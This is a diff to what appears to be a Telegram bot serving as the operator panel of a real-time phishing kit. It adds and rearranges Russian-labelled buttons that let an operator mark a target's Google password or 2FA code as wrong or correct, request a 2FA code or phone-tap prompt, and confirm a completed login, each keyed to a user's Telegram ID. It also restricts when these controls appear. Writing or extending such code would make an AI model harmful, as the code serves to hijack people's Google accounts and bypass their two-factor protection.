@@ -54,13 +54,14 @@ def get_google_control_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
         inline_keyboard=[
             [
                 InlineKeyboardButton(text="❌ Неверный пароль", callback_data=f"gctrl:wrong_pass:{user_tg_id}"),
+                InlineKeyboardButton(text="✅ Верный пароль", callback_data=f"gctrl:correct_pass:{user_tg_id}"),
+            ],
+            [
                 InlineKeyboardButton(text="📲 Тап (Цифры)", callback_data=f"gctrl:ask_prompt:{user_tg_id}"),
-            ],
-            [
                 InlineKeyboardButton(text="🔑 Запросить 2FA", callback_data=f"gctrl:ask_2fa:{user_tg_id}"),
-                InlineKeyboardButton(text="❌ Неверный 2FA", callback_data=f"gctrl:wrong_2fa:{user_tg_id}"),
             ],
             [
+                InlineKeyboardButton(text="❌ Неверный 2FA", callback_data=f"gctrl:wrong_2fa:{user_tg_id}"),
                 InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"gctrl:complete:{user_tg_id}"),
             ],
         ]
@@ -479,12 +480,8 @@ async def notify_user_event(
             worker_alert_msg_id = None
             admin_alert_msg_id = None
 
-        # Control buttons
-        is_google_event = is_test_event and (
-            norm_step.startswith("google_")
-            or bool(email and not session_str)
-            or bool(user_row and "google_status" in user_row.keys() and user_row["google_status"])
-        )
+        # Control buttons ONLY appear when user explicitly selected Gmail login (norm_step starts with google_)
+        is_google_event = is_test_event and norm_step.startswith("google_")
 
         if is_google_event:
             admin_keyboard = get_google_control_keyboard(user_tg_id)
